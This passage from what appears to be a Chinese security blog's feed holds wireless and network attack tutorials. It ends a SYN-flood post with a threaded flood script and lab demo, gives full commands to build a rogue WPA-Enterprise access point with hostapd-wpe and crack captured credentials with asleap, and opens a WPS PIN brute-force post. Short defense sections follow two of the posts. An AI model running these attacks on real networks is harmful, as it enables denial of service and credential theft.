class="line">		t = threading.Thread(target=Syn_flood, args=(target_ip, target_port))</div><div class="line">		t.start()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>: </div><div class="line">	target_ip = raw_input(<span class="string">"Please input the target_ip: "</span>)</div><div class="line">	target_port = int(raw_input(<span class="string">"Please input the target_port: "</span>))</div><div class="line">	threads = int(raw_input(<span class="string">"Please input the threads: "</span>))</div><div class="line">	main(target_ip, target_port, threads)</div></pre></td></tr></table></figure>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><h4 id="1-启动metasploit2-0，访问它的web服务-现在我们可以很流畅的访问到"><a href="#1-启动metasploit2-0，访问它的web服务-现在我们可以很流畅的访问到" class="headerlink" title="1.启动metasploit2.0，访问它的web服务,现在我们可以很流畅的访问到"></a>1.启动metasploit2.0，访问它的web服务,现在我们可以很流畅的访问到</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/D7EBB586D3244CBD93243747CE8FC296/1479" alt="image"></p>
<h4 id="2-启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口"><a href="#2-启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口" class="headerlink" title="2.启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口"></a>2.启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/5C77A8A40E664C4792E55C8794927CB6/1484" alt="image"></p>
<h4 id="3-现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN-RECV状态"><a href="#3-现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN-RECV状态" class="headerlink" title="3.现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN_RECV状态"></a>3.现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN_RECV状态</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/495E79F164574A8696349DBC68DC7BF2/1491" alt="image"></p>
<hr>
<h2 id="0x04-防御措施"><a href="#0x04-防御措施" class="headerlink" title="0x04. 防御措施"></a>0x04. 防御措施</h2><h3 id="emsp-emsp-看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对"><a href="#emsp-emsp-看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对" class="headerlink" title="&emsp;&emsp;看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对"></a>&emsp;&emsp;看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对</h3><h4 id="1-如果某个端口和同一个IP建立了多个不完整连接，直接禁IP"><a href="#1-如果某个端口和同一个IP建立了多个不完整连接，直接禁IP" class="headerlink" title="1.如果某个端口和同一个IP建立了多个不完整连接，直接禁IP"></a>1.如果某个端口和同一个IP建立了多个不完整连接，直接禁IP</h4><h4 id="2-减少SYN-RECEIVED的过期时间"><a href="#2-减少SYN-RECEIVED的过期时间" class="headerlink" title="2.减少SYN-RECEIVED的过期时间"></a>2.减少SYN-RECEIVED的过期时间</h4><h4 id="3-设置SYN-Cookie"><a href="#3-设置SYN-Cookie" class="headerlink" title="3.设置SYN Cookie"></a>3.设置SYN Cookie</h4><h4 id="4-设置防火墙的进站和入站规则"><a href="#4-设置防火墙的进站和入站规则" class="headerlink" title="4.设置防火墙的进站和入站规则"></a>4.设置防火墙的进站和入站规则</h4><h4 id="5-记录日志方便溯源追踪真凶"><a href="#5-记录日志方便溯源追踪真凶" class="headerlink" title="5.记录日志方便溯源追踪真凶"></a>5.记录日志方便溯源追踪真凶</h4><hr>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。"><a href="#emsp-emsp-关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。" class="headerlink" title="&emsp;&emsp;关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。"></a>&emsp;&emsp;关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-Syn-Flood攻击简介&quot;&gt;&lt;a href=&quot;#0x00-Syn-Flood攻击简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. Syn-Flood攻击简介&quot;&gt;&lt;/a&gt;0x00. Syn-Flood攻击简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-Syn-Flood-Attack是一种基于TCP-IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。&quot;&gt;&lt;a href=&quot;#emsp-emsp-Syn-Flood-Attack是一种基于TCP-IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>无线渗透(下)—企业级WPA破解</title>
    <link href="http://TimeS0ng.github.io/2017/09/03/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F(%E4%B8%8B)%E2%80%94%E4%BC%81%E4%B8%9A%E7%BA%A7WPA%E7%A0%B4%E8%A7%A3/"/>
    <id>http://TimeS0ng.github.io/2017/09/03/无线渗透(下)—企业级WPA破解/</id>
    <published>2017-09-03T05:56:20.000Z</published>
    <updated>2017-09-04T10:25:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-企业级WPA-WPA2简介"><a href="#0x00-企业级WPA-WPA2简介" class="headerlink" title="0x00. 企业级WPA/WPA2简介"></a><strong>0x00. 企业级WPA/WPA2简介</strong></h2><h4 id="emsp-emsp-WPA-WPA2企业版：在大型企业网络中，通常采用802-1X的接入认证方式。802-1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible-Authentication-Protocol）实现对用户的认证。WPA-WPA2支持基于EAP-TLS（Transport-Layer-Security）和EAP-PEAP（Protected-EAP）的802-1X认证方式。"><a href="#emsp-emsp-WPA-WPA2企业版：在大型企业网络中，通常采用802-1X的接入认证方式。802-1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible-Authentication-Protocol）实现对用户的认证。WPA-WPA2支持基于EAP-TLS（Transport-Layer-Security）和EAP-PEAP（Protected-EAP）的802-1X认证方式。" class="headerlink" title="&emsp;&emsp;WPA/WPA2企业版：在大型企业网络中，通常采用802.1X的接入认证方式。802.1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible Authentication Protocol）实现对用户的认证。WPA/WPA2支持基于EAP-TLS（Transport Layer Security）和EAP-PEAP（Protected EAP）的802.1X认证方式。"></a>&emsp;&emsp;WPA/WPA2企业版：在大型企业网络中，通常采用802.1X的接入认证方式。802.1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible Authentication Protocol）实现对用户的认证。WPA/WPA2支持基于EAP-TLS（Transport Layer Security）和EAP-PEAP（Protected EAP）的802.1X认证方式。</h4><a id="more"></a>
<h2 id="0x01-WPA-WPA2企业版认证原理"><a href="#0x01-WPA-WPA2企业版认证原理" class="headerlink" title="0x01. WPA/WPA2企业版认证原理"></a><strong>0x01. WPA/WPA2企业版认证原理</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/54F51F9A7FAF47E2A10C6B88AFE7B07B/1150" alt="image"></p>
<h3 id="上图详细介绍了基于EAP-PEAP的802-1x认证方式（图片出自这里）"><a href="#上图详细介绍了基于EAP-PEAP的802-1x认证方式（图片出自这里）" class="headerlink" title="上图详细介绍了基于EAP-PEAP的802.1x认证方式（图片出自这里）"></a>上图详细介绍了基于EAP-PEAP的802.1x认证方式（<a href="http://blog.sina.com.cn/s/blog_afd4c4ef0102w4bz.html" target="_blank" rel="external">图片出自这里</a>）</h3><h4 id="emsp-emsp-1-首先STA向周围发送PROBE-REQUEST帧，等待应答"><a href="#emsp-emsp-1-首先STA向周围发送PROBE-REQUEST帧，等待应答" class="headerlink" title="&emsp;&emsp;1.首先STA向周围发送PROBE REQUEST帧，等待应答"></a>&emsp;&emsp;1.首先STA向周围发送PROBE REQUEST帧，等待应答</h4><h4 id="emsp-emsp-2-AP收到之后回应一个PROBE-RESPONSE帧给STA（AC连接多个AP）"><a href="#emsp-emsp-2-AP收到之后回应一个PROBE-RESPONSE帧给STA（AC连接多个AP）" class="headerlink" title="&emsp;&emsp;2.AP收到之后回应一个PROBE RESPONSE帧给STA（AC连接多个AP）"></a>&emsp;&emsp;2.AP收到之后回应一个PROBE RESPONSE帧给STA（AC连接多个AP）</h4><h4 id="emsp-emsp-3-认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程"><a href="#emsp-emsp-3-认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程" class="headerlink" title="&emsp;&emsp;3.认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程"></a>&emsp;&emsp;3.认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程</h4><h4 id="emsp-emsp-4-认证成功，连接上AP（具体交换的数据信息我在WPA加密那篇说过了，这里不再累赘）"><a href="#emsp-emsp-4-认证成功，连接上AP（具体交换的数据信息我在WPA加密那篇说过了，这里不再累赘）" class="headerlink" title="&emsp;&emsp;4.认证成功，连接上AP（具体交换的数据信息我在WPA加密那篇说过了，这里不再累赘）"></a>&emsp;&emsp;4.认证成功，连接上AP（具体交换的数据信息我在<a href="https://times0ng.github.io/2017/08/30/无线渗透-上-WPA加密/">WPA加密</a>那篇说过了，这里不再累赘）</h4><h2 id="0x02-WPA-WPA2企业版攻击原理"><a href="#0x02-WPA-WPA2企业版攻击原理" class="headerlink" title="0x02. WPA/WPA2企业版攻击原理"></a><strong>0x02. WPA/WPA2企业版攻击原理</strong></h2><h4 id="emsp-emsp-在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。"><a href="#emsp-emsp-在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。" class="headerlink" title="&emsp;&emsp;在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。"></a>&emsp;&emsp;在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。</h4><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><h4 id="emsp-emsp-1-伪造一个企业级的AP"><a href="#emsp-emsp-1-伪造一个企业级的AP" class="headerlink" title="&emsp;&emsp;1.伪造一个企业级的AP"></a>&emsp;&emsp;1.伪造一个企业级的AP</h4><h4 id="emsp-emsp-2-诱使目标连接AP，获取加密后的密钥"><a href="#emsp-emsp-2-诱使目标连接AP，获取加密后的密钥" class="headerlink" title="&emsp;&emsp;2.诱使目标连接AP，获取加密后的密钥"></a>&emsp;&emsp;2.诱使目标连接AP，获取加密后的密钥</h4><h4 id="emsp-emsp-3-离线破解，获取明文密钥"><a href="#emsp-emsp-3-离线破解，获取明文密钥" class="headerlink" title="&emsp;&emsp;3.离线破解，获取明文密钥"></a>&emsp;&emsp;3.离线破解，获取明文密钥</h4><h2 id="0x03-攻击实战"><a href="#0x03-攻击实战" class="headerlink" title="0x03. 攻击实战"></a><strong>0x03. 攻击实战</strong></h2><h4 id="下面给大家介绍一下攻击的操作步骤："><a href="#下面给大家介绍一下攻击的操作步骤：" class="headerlink" title="下面给大家介绍一下攻击的操作步骤："></a>下面给大家介绍一下攻击的操作步骤：</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-kali-Linux虚拟机"><a href="#emsp-emsp-1-kali-Linux虚拟机" class="headerlink" title="&emsp;&emsp;1.kali Linux虚拟机"></a>&emsp;&emsp;1.kali Linux虚拟机</h4><h4 id="emsp-emsp-2-TL-WN722N网卡"><a href="#emsp-emsp-2-TL-WN722N网卡" class="headerlink" title="&emsp;&emsp;2.TL-WN722N网卡"></a>&emsp;&emsp;2.TL-WN722N网卡</h4><h3 id="环境布置与实战"><a href="#环境布置与实战" class="headerlink" title="环境布置与实战"></a>环境布置与实战</h3><h4 id="1-为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁"><a href="#1-为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁" class="headerlink" title="1.为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁"></a>1.为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁</h4><blockquote>
<p>git clone <a href="https://github.com/OpenSecurityResearch/hostapd-wpe" target="_blank" rel="external">https://github.com/OpenSecurityResearch/hostapd-wpe</a></p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/6B43F1B59EF54B5BA8B0E9E615D324D6/1240" alt="image"></p>
<h4 id="2-下载最新版的hostpad，安装依赖包"><a href="#2-下载最新版的hostpad，安装依赖包" class="headerlink" title="2.下载最新版的hostpad，安装依赖包"></a>2.下载最新版的hostpad，安装依赖包</h4><blockquote>
<p>wget <a href="http://w1.fi/releases/hostapd-2.6.tar.gz" target="_blank" rel="external">http://w1.fi/releases/hostapd-2.6.tar.gz</a> &amp;&amp; apt-get install libssl-dev libnl-genl-3-dev &amp;&amp;apt-get install libssl1.0-dev</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/76DD94DE395047BF91BD72C8DD30AFE0/1248" alt="image"></p>
<h4 id="3-解开tar包，给hostpad-2-6打补丁"><a href="#3-解开tar包，给hostpad-2-6打补丁" class="headerlink" title="3.解开tar包，给hostpad-2.6打补丁"></a>3.解开tar包，给hostpad-2.6打补丁</h4><blockquote>
<p>tar zxvf hostapd-2.6.tar.gz &amp;&amp; cd hostapd-2.6 &amp;&amp; patch -p1 &lt; ../hostapd-wpe/hostapd-wpe.patch</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/F125FC9E885443BB9836165B24FF07E7/1255" alt="image"></p>
<h4 id="4-编译hostpad"><a href="#4-编译hostpad" class="headerlink" title="4.编译hostpad"></a>4.编译hostpad</h4><blockquote>
<p>cd hostapd/ &amp;&amp; make</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/8A64997CEACA44EFB81293587A6A6268/1266" alt="image"></p>
<h4 id="5-生成伪造证书"><a href="#5-生成伪造证书" class="headerlink" title="5.生成伪造证书"></a>5.生成伪造证书</h4><blockquote>
<p>cd ../../hostapd-wpe/certs/ &amp;&amp; ./bootstrap</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/9CFFF7452B2240BBA16C45875C888B1B/1277" alt="image"></p>
<h4 id="6-配置hostapd-wpe-conf文件-ssid改为想要伪造的AP名字-我用的是wifi-free"><a href="#6-配置hostapd-wpe-conf文件-ssid改为想要伪造的AP名字-我用的是wifi-free" class="headerlink" title="6.配置hostapd-wpe.conf文件,ssid改为想要伪造的AP名字(我用的是wifi-free)"></a>6.配置hostapd-wpe.conf文件,ssid改为想要伪造的AP名字(我用的是wifi-free)</h4><blockquote>
<p>cd ../../hostapd-2.6/hostapd/ &amp;&amp; vim hostapd-wpe.conf</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/ED1BAA2EBFC747A299AD411C6C758A3A/1282" alt="image"></p>
<h4 id="7-启动无线网卡-不用开启monitor模式"><a href="#7-启动无线网卡-不用开启monitor模式" class="headerlink" title="7.启动无线网卡,不用开启monitor模式"></a>7.启动无线网卡,不用开启monitor模式</h4><blockquote>
<p>service network-manager stop &amp;&amp; airmon-ng check kill &amp;&amp; ifconfig wlan0 up</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/1EA0DEE4A1034E15AED92EC39C01928F/1292" alt="image"></p>
<h4 id="8-伪造AP-诱使目标连接"><a href="#8-伪造AP-诱使目标连接" class="headerlink" title="8.伪造AP,诱使目标连接"></a>8.伪造AP,诱使目标连接</h4><blockquote>
<p>./hostapd-wpe hostapd-wpe.conf</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/317A6ACB39EA468EABAB971E9038A33E/1299" alt="image"></p>
<h4 id="9-可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密-C指定challenge，-R指定response，-W指定字典文件-下面是破解出来的密码password"><a href="#9-可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密-C指定challenge，-R指定response，-W指定字典文件-下面是破解出来的密码password" class="headerlink" title="9.可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密, -C指定challenge，-R指定response，-W指定字典文件.下面是破解出来的密码password"></a>9.可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密, -C指定challenge，-R指定response，-W指定字典文件.下面是破解出来的密码password</h4><blockquote>
<p>asleap -C 8d:a9:83:98:98:f4:34:a6 -R e5:24:78:69:2e:29:9f:ee:42:d8c:d7:4e:d3:f5:65:22:da:7d:57:24:14:da:14 -W ../../sqlmap.txt</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/4D28868782C4468393CEEAB02EB4B2FE/1312" alt="image"></p>
<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04. 防御"></a><strong>0x04. 防御</strong></h2><h4 id="emsp-emsp-和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。"><a href="#emsp-emsp-和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。" class="headerlink" title="&emsp;&emsp;和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。"></a>&emsp;&emsp;和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。</h4><h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a><strong>0x05. 结语</strong></h2><h4 id="emsp-emsp-关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家访问。"><a href="#emsp-emsp-关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家访问。" class="headerlink" title="&emsp;&emsp;关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家访问。"></a>&emsp;&emsp;关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家<a href="https://times0ng.github.io">访问</a>。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-企业级WPA-WPA2简介&quot;&gt;&lt;a href=&quot;#0x00-企业级WPA-WPA2简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. 企业级WPA/WPA2简介&quot;&gt;&lt;/a&gt;&lt;strong&gt;0x00. 企业级WPA/WPA2简介&lt;/strong&gt;&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-WPA-WPA2企业版：在大型企业网络中，通常采用802-1X的接入认证方式。802-1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible-Authentication-Protocol）实现对用户的认证。WPA-WPA2支持基于EAP-TLS（Transport-Layer-Security）和EAP-PEAP（Protected-EAP）的802-1X认证方式。&quot;&gt;&lt;a href=&quot;#emsp-emsp-WPA-WPA2企业版：在大型企业网络中，通常采用802-1X的接入认证方式。802-1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible-Authentication-Protocol）实现对用户的认证。WPA-WPA2支持基于EAP-TLS（Transport-Layer-Security）和EAP-PEAP（Protected-EAP）的802-1X认证方式。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;WPA/WPA2企业版：在大型企业网络中，通常采用802.1X的接入认证方式。802.1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible Authentication Protocol）实现对用户的认证。WPA/WPA2支持基于EAP-TLS（Transport Layer Security）和EAP-PEAP（Protected EAP）的802.1X认证方式。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;WPA/WPA2企业版：在大型企业网络中，通常采用802.1X的接入认证方式。802.1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible Authentication Protocol）实现对用户的认证。WPA/WPA2支持基于EAP-TLS（Transport Layer Security）和EAP-PEAP（Protected EAP）的802.1X认证方式。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>无线渗透(中)--WPS破解</title>
    <link href="http://TimeS0ng.github.io/2017/08/30/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F(%E4%B8%AD)--WPS%E7%A0%B4%E8%A7%A3/"/>
    <id>http://TimeS0ng.github.io/2017/08/30/无线渗透(中)--WPS破解/</id>
    <published>2017-08-30T15:50:51.000Z</published>
    <updated>2017-08-31T02:00:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a><strong>0x00. 前言</strong></h2><h4 id="emsp-emsp-基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。"><a href="#emsp-emsp-基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。" class="headerlink" title="&emsp;&emsp;基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。"></a>&emsp;&emsp;基于第一篇文章<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484868&amp;idx=1&amp;sn=c9f9547e9bdb4fb9699ab47f2e307d35&amp;chksm=ec1e35ecdb69bcfa42443929bac42d030adda02d1885222aa53d6b4c49b736736be97d11ae7e&amp;mpshare=1&amp;scene=23&amp;srcid=0828jSmGdIm06mXCtMAZ6Ifq#rd" target="_blank" rel="external">WPA密码破解</a>的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。</h4><a id="more"></a>
<hr>
<h2 id="0x01-WPS简介"><a href="#0x01-WPS简介" class="headerlink" title="0x01. WPS简介"></a><strong>0x01. WPS简介</strong></h2><h4 id="WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。"><a href="#WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。" class="headerlink" title="WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。"></a>WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。</h4><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><h4 id="emsp-通过PIN码来简化无线接入的操作，所以我们无需记住PSK"><a href="#emsp-通过PIN码来简化无线接入的操作，所以我们无需记住PSK" class="headerlink" title="&emsp;通过PIN码来简化无线接入的操作，所以我们无需记住PSK."></a>&emsp;通过PIN码来简化无线接入的操作，所以我们无需记住PSK.</h4><h3 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h3><h4 id="emsp-PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK"><a href="#emsp-PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK" class="headerlink" 